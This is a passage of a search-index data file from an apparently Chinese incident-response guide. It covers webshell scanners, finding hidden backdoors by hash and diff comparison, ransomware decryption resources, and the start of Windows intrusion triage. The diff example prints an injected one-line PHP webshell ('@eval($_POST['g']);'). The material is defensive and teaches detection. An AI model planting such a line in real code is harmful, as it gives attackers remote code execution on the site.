WebShellKill(\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177)\u662f\u4e00\u6b3eweb\u540e\u95e8\u4e13\u6740\u5de5\u5177\uff0c\u4e0d\u4ec5\u652f\u6301webshell\u7684\u626b\u63cf\uff0c\u540c\u65f6\u8fd8\u652f\u6301\u6697\u94fe\u7684\u626b\u63cf\u3002\u662f\u4e00\u6b3e\u878d\u5408\u4e86\u591a\u91cd\u68c0\u6d4b\u5f15\u64ce\u7684\u67e5\u6740\u5de5\u5177\u3002\u80fd\u66f4\u7cbe\u51c6\u5730\u68c0\u6d4b\u51faWEB\u7f51\u7ad9\u5df2\u77e5\u548c\u672a\u77e5\u7684\u540e\u95e8\u6587\u4ef6\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301Windows\u3001linux \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://edr.sangfor.com.cn/backdoor_detection.html \uff08\u5df2\u505c\u6b62\u8bbf\u95ee\uff09 7\u3001\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b\u68c0\u6d4bPHP Webshell \u4e00\u4e2a\u6df1\u5ea6\u5b66\u4e60PHP webshell\u67e5\u6740\u5f15\u64cedemo\uff0c\u63d0\u4f9b\u5728\u7ebf\u6837\u672c\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://webshell.cdxy.me/ 8\u3001PHP Malware Finder PHP-malware-finder \u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u68c0\u6d4bwebshell\u548c\u6076\u610f\u8f6f\u4ef6\u6df7\u6dc6\u4ee3\u7801\u7684\u5de5\u5177 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9blinux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/jvoisin/php-malware-finder 9\u3001findWebshell \u8fd9\u4e2a\u9879\u76ee\u662f\u4e00\u6b3e\u57fa\u4e8epython\u5f00\u53d1\u7684webshell\u68c0\u67e5\u5de5\u5177\uff0c\u53ef\u4ee5\u6839\u636e\u7279\u5f81\u7801\u5339\u914d\u68c0\u67e5\u4efb\u610f\u7c7b\u578b\u7684webshell\u540e\u95e8\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/he1m4n6a/findWebshell 10\u3001\u5728\u7ebfwebshell\u67e5\u6740\u5de5\u5177 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://tools.bugscaner.com/killwebshell/ \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u00b6 \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u7684\u7f51\u7ad9\u88ab\u5165\u4fb5\uff0c\u653b\u51fb\u8005\u7559\u4e0b\u9690\u85cf\u7684\u540e\u95e8\uff0c\u4f60\u771f\u7684\u90fd\u53ef\u4ee5\u627e\u51fa\u6765\u561b\uff1f\u9762\u5bf9\u4e00\u4e2a\u5927\u4e2d\u578b\u7684\u5e94\u7528\u7cfb\u7edf\uff0c\u6570\u4ee5\u767e\u4e07\u7ea7\u7684\u4ee3\u7801\u884c\uff0c\u662f\u4e0d\u53ef\u80fd\u505a\u5230\u6bcf\u4e2a\u6587\u4ef6\u6bcf\u6bb5\u4ee3\u7801\u8fdb\u884c\u624b\u5de5\u68c0\u67e5\u7684\u3002 \u5373\u4f7f\u662f\u4e00\u6b3e\u62e5\u670999.9%\u7684Webshell\u68c0\u51fa\u7387\u7684\u68c0\u6d4b\u5f15\u64ce\uff0c\u4f9d\u7136\u53ef\u80fd\u5b58\u5728Webshell\u7ed5\u8fc7\u7684\u60c5\u51b5\u3002\u53e6\u5916\uff0c\u50cf\u6697\u94fe\u3001\u7f51\u9875\u52ab\u6301\u3001\u9875\u9762\u8df3\u8f6c\u7b49\u5e38\u89c1\u7684\u9ed1\u5e3dSEO\u624b\u6cd5\uff0c\u4e5f\u5f88\u96be\u901a\u8fc7\u624b\u52a8\u68c0\u6d4b\u6216\u5de5\u5177\u68c0\u6d4b\u5168\u90e8\u8bc6\u522b\u51fa\u6765\u3002 \u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u505a\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u901a\u8fc7\u4e0e\u539f\u59cb\u4ee3\u7801\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u5feb\u901f\u53d1\u73b0\u6587\u4ef6\u662f\u5426\u88ab\u7be1\u6539\u4ee5\u53ca\u88ab\u7be1\u6539\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\uff0c\u7b2c\u4e00\u4e2a\u524d\u63d0\u662f\uff0c\u4f60\u6240\u5728\u7684\u56e2\u961f\u5df2\u5177\u5907\u4ee3\u7801\u7248\u672c\u7ba1\u7406\u7684\u80fd\u529b\uff0c\u5982\u679c\u4f60\u662f\u4e2a\u4eba\u7ad9\u957f\uff0c\u76f8\u4fe1\u4f60\u5df2\u7ecf\u5907\u4efd\u4e86\u539f\u59cb\u4ee3\u7801\u3002 \u672c\u6587\u5c06\u7ed3\u5408\u5b9e\u9645\u5e94\u7528\uff0c\u4ecb\u7ecd\u51e0\u79cd\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u627e\u51fa\u4ee3\u7801\u4e2d\u6240\u6709\u9690\u85cf\u7684\u540e\u95e8\u3002 1\u3001\u6587\u4ef6MD5\u6821\u9a8c \u4e0b\u8f7dD\u76fe_Web\u67e5\u6740\u5de5\u5177\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u7559\u610f\u5230\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u91cc\uff0c\u9664\u4e86\u6709\u4e00\u4e2aexe\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u6587\u4ef6md5\u503c\u3002\u8fd9\u4e2a\u662f\u8f6f\u4ef6\u4f5c\u8005\u5728\u53d1\u5e03\u8f6f\u4ef6\u65f6\uff0c\u901a\u8fc7md5\u7b97\u6cd5\u8ba1\u7b97\u51fa\u8be5exe\u6587\u4ef6\u7684\u201c\u7279\u5f81\u503c\u201d\u3002 \u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.d99net.net/down/WebShellKill_V2.0.9.zip \u6587\u4ef6MD5\uff1a29285decadbce3918a4f8429ec33df46 WebShellKill.exe \u5f53\u7528\u6237\u4e0b\u8f7d\u8f6f\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u6821\u9a8c\u7b97\u6cd5\u8ba1\u7b97\u4e0b\u8f7d\u5230exe\u6587\u4ef6\u7684\u7279\u5f81\u503c\uff0c\u5e76\u4e0e\u8f6f\u4ef6\u5f00\u53d1\u8005\u53d1\u5e03\u7684\u7279\u5f81\u503c\u6bd4\u8f83\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u76f8\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230\u7684exe\u6587\u4ef6\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u4e0d\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230exe\u6587\u4ef6\u662f\u88ab\u7be1\u6539\u8fc7\u7684\u3002 \u90a3\u540c\u7406\u53ef\u5f97\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6240\u6709\u7f51\u7ad9\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u5f53\u51fa\u73b0\u5e94\u6025\u60c5\u51b5\u65f6\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e00\u6b21hash\u503c\uff0c\u5e76\u4e0e\u4e0a\u6b21\u4fdd\u5b58\u7684hash\u503c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4ece\u800c\u8f93\u51fa\u65b0\u521b\u5efa\u7684\u3001\u4fee\u6539\u8fc7\u53ca\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 \u6587\u4ef6hash\u503c\u8ba1\u7b97\uff1a def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) \u5bf9\u6587\u4ef6\u8fdb\u884c\u54c8\u5e0c\u503c\u91cd\u65b0\u8ba1\u7b97\uff0c\u8fdb\u884c\u6821\u9a8c\u5bf9\u6bd4\uff0c\u6d4b\u8bd5\u6548\u679c\uff1a \u5982\u4e0a\u56fe\uff0c\u5728\u4e0a\u4f20\u76ee\u5f55\u65b0\u589e\u4e86\u4e00\u4e2aevil.php\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u6587\u4ef6\u662flow.php\u3002\u4f7f\u7528\u5e38\u89c1\u7684\u7f16\u8f91\u5668NotePad++\u8fdb\u884c\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0low.php\u6587\u4ef6\u91cc\u88ab\u63d2\u5165\u4e86\u4e00\u53e5\u8bddwebshell\u3002 2\u3001diff\u547d\u4ee4 \u5728linux\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528diff\u6765\u6bd4\u8f83\u4e24\u4e2a\u6587\u672c\u6587\u4ef6\u7684\u5dee\u5f02\u3002\u540c\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5feb\u901f\u627e\u51fa\u4e24\u4e2a\u9879\u76ee\u6587\u4ef6\u7684\u5dee\u5f02\u3002 diff -c -a -r cms1 cms2 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u524d\u4e09\u884c\u5217\u51fa\u4e86\u4e24\u4e2a\u8981\u5bf9\u6bd4\u7684\u6587\u4ef6\u76ee\u5f55\u7684\u5dee\u5f02\uff0c\u53ef\u4ee5\u53d1\u73b0low.php\u6587\u4ef6\u88ab\u7be1\u6539\u8fc7\uff0c\u7be1\u6539\u7684\u5185\u5bb9\u662f @eval($_POST['g']); \u3002 \u5907\u6ce8\uff1a\u5982\u679c\u53ea\u662f\u60f3\u67e5\u770b\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e0d\u540c\u53c8\u4e0d\u60f3\u663e\u793a\u5dee\u5f02\u4e4b\u5904\u7684\u8bdd\uff0c\u53ef\u4ee5\u52a0\u4e0a\uff0dq\u9009\u9879\u3002 3\u3001\u7248\u672c\u63a7\u5236\u5de5\u5177 \u7248\u672c\u63a7\u5236\u5de5\u5177\uff0c\u6bd4\u5982\u8bf4git\uff0c\u91cd\u65b0\u4e0a\u4f20\u4ee3\u7801\u5230git\uff0cadd+commit+push\uff0c\u7136\u540e\u6253\u5f00\u9879\u76ee\uff0c\u70b9\u51fbcommits\uff0c\u5728\u5386\u53f2\u63d0\u4ea4\u7248\u672c\u91cc\u9762\uff0c\u67e5\u770b\u6587\u4ef6\u66f4\u6539\u5185\u5bb9\uff0c\u5f88\u5bb9\u6613\u5c31\u53ef\u4ee5\u53d1\u73b0\u4ee3\u7801\u88ab\u7be1\u6539\u7684\u5730\u65b9\u4e86\u3002 \u53e6\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7git diff \u7528\u6765\u6bd4\u8f83\u6587\u4ef6\u4e4b\u95f4\u7684\u4e0d\u540c\u3002 4\u3001\u6587\u4ef6\u5bf9\u6bd4\u5de5\u5177 \u5173\u952e\u8bcd\uff1a\u4ee3\u7801\u5bf9\u6bd4\u5de5\u5177\uff0c\u4f60\u4f1a\u627e\u5230\u5f88\u591a\u597d\u7528\u7684\u5de5\u5177\uff0c\u8fd9\u91cc\u6211\u4eec\u63a8\u8350\u4e24\u6b3e\u6548\u679c\u8fd8\u4e0d\u9519\u7684\u5de5\u5177\uff0cBeyond Compare\u548cWinMerge\u3002 Beyond Compare Beyond Compare\u662f\u4e00\u5957\u7531Scooter Software\u63a8\u51fa\u7684\u6587\u4ef6\u6bd4\u8f83\u5de5\u5177\u3002\u4e3b\u8981\u7528\u9014\u662f\u5bf9\u6bd4\u4e24\u4e2a\u6587\u4ef6\u5939\u6216\u8005\u6587\u4ef6\uff0c\u5e76\u5c06\u5dee\u5f02\u4ee5\u989c\u8272\u6807\u793a\uff0c\u6bd4\u8f83\u8303\u56f4\u5305\u62ec\u76ee\u5f55\uff0c\u6587\u6863\u5185\u5bb9\u7b49\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.scootersoftware.com/download.php \u8f6f\u4ef6\u4f7f\u7528\u793a\u4f8b\uff0c\u901a\u8fc7\u6587\u4ef6\u5939\u6bd4\u8f83\uff0c\u627e\u51fa\u6587\u4ef6\u5939\u4e2d\u7684\u5dee\u5f02\u5185\u5bb9\u3002 1\u3001\u53cc\u51fbBeyond Compare \uff0c\u6253\u5f00\u8f6f\u4ef6\u4e3b\u9875\uff0c\u9009\u62e9\u6587\u4ef6\u5939\u6bd4\u8f83\u3002 2\u3001\u5728\u53cc\u8fb9\u680f\u8f93\u5165\u6587\u4ef6\u5939\u8def\u5f84\uff0c\u70b9\u51fb\u663e\u793a\u5dee\u522b\uff0c\u5217\u51fa\u5dee\u5f02\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7d2b\u8272\u90e8\u5206\u4e3a\u65b0\u589e\u6587\u4ef6\uff0c\u7ea2\u8272\u90e8\u5206\u4e3a\u7be1\u6539\u6587\u4ef6\u3002 3\u3001\u53cc\u51fb\u5177\u4f53\u6587\u4ef6\uff0c\u8fdb\u5165\u4ee3\u7801\u5bf9\u6bd4\uff0c\u627e\u5230\u4ee3\u7801\u5dee\u5f02\u90e8\u5206\u3002 WinMerge WinMerge\u662f\u4e00\u6b3e\u8fd0\u884c\u4e8eWindows\u7cfb\u7edf\u4e0b\u7684\u6587\u4ef6\u6bd4\u8f83\u548c\u5408\u5e76\u5de5\u5177\uff0c\u4f7f\u7528\u5b83\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u6bd4\u8f83\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u4ee5\u6613\u4e8e\u7406\u89e3\u7684\u53ef\u89c6\u6587\u672c\u683c\u5f0f\u663e\u793a\u5dee\u5f02\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://winmerge.org/downloads/ 1\u3001\u6587\u4ef6--\u6253\u5f00\uff0c\u9009\u62e9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u7136\u540e\u70b9\u51fb\u8fdb\u884c\u6bd4\u8f83\u3002 2\u3001\u5728\u540c\u4e00\u4e2a\u754c\u9762\u91cc\uff0c\u901a\u8fc7\u989c\u8272\u548c\u6587\u672c\u63d0\u793a\uff0c\u663e\u793a\u6587\u4ef6\u5939\u5185\u5bb9\u5dee\u5f02\u3002 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 \u00b6 \u7ecf\u5e38\u4f1a\u6709\u4e00\u4e9b\u5c0f\u4f19\u4f34\u95ee\uff1a\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u8be5\u600e\u4e48\u529e\uff0c\u53ef\u4ee5\u89e3\u5bc6\u5417\uff1f \u7b2c\u4e00\u6b21\u9047\u5230\u52d2\u7d22\u75c5\u6bd2\u662f\u5728\u65e9\u51e0\u5e74\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u56e0\u7f51\u7ad9\u8bbf\u95ee\u5f02\u5e38\uff0c\u8fdb\u800c\u8fdc\u7a0b\u534f\u52a9\u8fdb\u884c\u6392\u67e5\u3002\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u540e\u7f00\u540d\u88ab\u7be1\u6539\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a\u6587\u4ef6\u6253\u5f00\u540e\u663e\u793a\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u8fd9\u4fbf\u662f\u52d2\u7d22\u75c5\u6bd2\u7684\u7279\u5f81\u3002 \u51fa\u4e8e\u804c\u4e1a\u4e60\u60ef\uff0c\u6211\u6253\u5305\u4e86\u90e8\u5206\u52a0\u5bc6\u6587\u4ef6\u6837\u672c\u548c\u52d2\u7d22\u75c5\u6bd2\u63d0\u793a\u4fe1\u606f\u7528\u4e8e\u7559\u6863\uff0c\u5c31\u5728\u4eca\u5929\uff0c\u6211\u53c8\u91cd\u65b0\u4e0a\u4f20\u4e86\u6837\u672c\uff0c\u81f3\u4eca\u4f9d\u7136\u65e0\u6cd5\u89e3\u5bc6\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5e08\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u5404\u5927\u5b89\u5168\u516c\u53f8\u7684\u80fd\u529b\uff0c\u5bfb\u627e\u52d2\u7d22\u75c5\u6bd2\u7684\u89e3\u5bc6\u5de5\u5177\u3002 \u672c\u6587\u6574\u7406\u4e86\u4e00\u4efd\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357\uff0c\u901a\u8fc7\u52d2\u7d22\u75c5\u6bd2\u7d22\u5f15\u5f15\u64ce\u67e5\u627e\u52d2\u7d22\u75c5\u6bd2\u76f8\u5173\u4fe1\u606f\uff0c\u518d\u901a\u8fc7\u5404\u4e2a\u5b89\u5168\u516c\u53f8\u63d0\u4f9b\u7684\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u89e3\u5bc6\u3002\u5f53\u7136\uff0c\u80fd\u5426\u89e3\u5bc6\u5168\u51ed\u8fd0\u6c14\uff0cso\uff0c\u5e73\u65f6\u8fd8\u662f\u52e4\u6253\u8865\u4e01\u591a\u5907\u4efd\u3002 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5728\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\u8f93\u5165\u75c5\u6bd2\u540d\u3001\u52d2\u7d22\u90ae\u7bb1\u3001\u88ab\u52a0\u5bc6\u540e\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u6216\u76f4\u63a5\u4e0a\u4f20\u88ab\u52a0\u5bc6\u6587\u4ef6\u3001\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u5373\u53ef\u53ef\u5feb\u901f\u67e5\u627e\u5230\u75c5\u6bd2\u8be6\u60c5\u548c\u89e3\u5bc6\u5de5\u5177\u3002 \u8fd9\u4e9b\u7f51\u7ad9\u7684\u89e3\u5bc6\u80fd\u529b\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u662f\u503c\u5f97\u6536\u85cf\u7684\u51e0\u4e2a\u52d2\u7d22\u75c5\u6bd2\u5de5\u5177\u578b\u7f51\u7ad9\u3002 \u3010360\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7800\u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2\uff0c http://lesuobingdu.360.cn \u3010\u817e\u8baf\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7 300 \u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 https://guanjia.qq.com/pr/ls/ \u3010\u542f\u660e\u3011VenusEye\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u8d85300\u79cd\u52d2\u7d22\u75c5\u6bd2\u5bb6\u65cf https://lesuo.venuseye.com.cn/ \u3010\u5947\u5b89\u4fe1\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce https://lesuobingdu.qianxin.com/ \u3010\u6df1\u4fe1\u670d\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce https://edr.sangfor.com.cn/#/information/ransom_search \u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5f88\u591a\u5b89\u5168\u516c\u53f8\u90fd\u63d0\u4f9b\u4e86\u514d\u8d39\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d\uff0c\u6536\u96c6\u548c\u6574\u7406\u76f8\u5173\u4e0b\u8f7d\u5730\u5740\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u548c\u83b7\u53d6\u6700\u65b0\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u3002 \u3010\u817e\u8baf\u54c8\u52c3\u3011\u52d2\u7d22\u8f6f\u4ef6\u4e13\u6740\u5de5\u5177 https://habo.qq.com/tool/index \u3010\u91d1\u5c71\u6bd2\u9738\u3011\u52d2\u7d22\u75c5\u6bd2\u514d\u75ab\u5de5\u5177 http://www.duba.net/dbt/wannacry.html \u3010\u706b\u7ed2\u3011\u5b89\u5168\u5de5\u5177\u4e0b\u8f7d http://bbs.huorong.cn/forum-55-1.html \u3010\u745e\u661f\u3011\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d http://it.rising.com.cn/fanglesuo/index.html \u3010nomoreransom\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 https://www.nomoreransom.org/zh/index.html \u3010MalwareHunterTeam\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 https://id-ransomware.malwarehunterteam.com/ \u3010\u5361\u5df4\u65af\u57fa\u3011\u514d\u8d39\u52d2\u7d22\u89e3\u5bc6\u5668 https://noransom.kaspersky.com/ \u3010Avast\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 https://www.avast.com/zh-cn/ransomware-decryption-tools \u3010Emsisoft\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 https://www.emsisoft.com/ransomware-decryption-tools/free-download \u3010Github\u9879\u76ee\u3011\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u6536\u96c6\u6c47\u603b https://github.com/jiansiting/Decryption-Tools","title":"\u5e94\u6025\u54cd\u5e94"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#1window","text":"","title":"\u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x00","text":"\u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u5e38\u89c1\u7684\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u7c7b\uff1a web\u5165\u4fb5\uff1a\u7f51\u9875\u6302\u9a6c\u3001\u4e3b\u9875\u7be1\u6539\u3001Webshell \u7cfb\u7edf\u5165\u4fb5\uff1a\u75c5\u6bd2\u6728\u9a6c\u3001\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u63a7\u540e\u95e8 \u7f51\u7edc\u653b\u51fb\uff1aDDOS\u653b\u51fb\u3001DNS\u52ab\u6301\u3001ARP\u6b3a\u9a97 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9bWindow\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x01","text":"","title":"0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#11","text":"1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u6709\u5f31\u53e3\u4ee4\uff0c\u8fdc\u7a0b\u7ba1\u7406\u7aef\u53e3\u662f\u5426\u5bf9\u516c\u7f51\u5f00\u653e\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u636e\u5b9e\u9645\u60c5\u51b5\u54a8\u8be2\u76f8\u5173\u670d\u52a1\u5668\u7ba1\u7406\u5458\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 3\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 4\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R\u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\u201ceventvwr.msc\u201d\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 b\u3001\u5bfc\u51faWindows\u65e5\u5fd7--\u5b89\u5168\uff0c\u5229\u7528Log Parser\u8fdb\u884c\u5206\u6790\u3002","title":"1.1 \u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#12","text":"1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001netstat -ano \u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684ESTABLISHED b\u3001\u6839\u636enetstat \u5b9a\u4f4d\u51fa\u7684pid\uff0c\u518d\u901a\u8fc7tasklist\u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \u201cPID\u201d 2\u3001\u8fdb\u7a0b \u68c0\u67e5\u65b9\u6cd5\uff1a 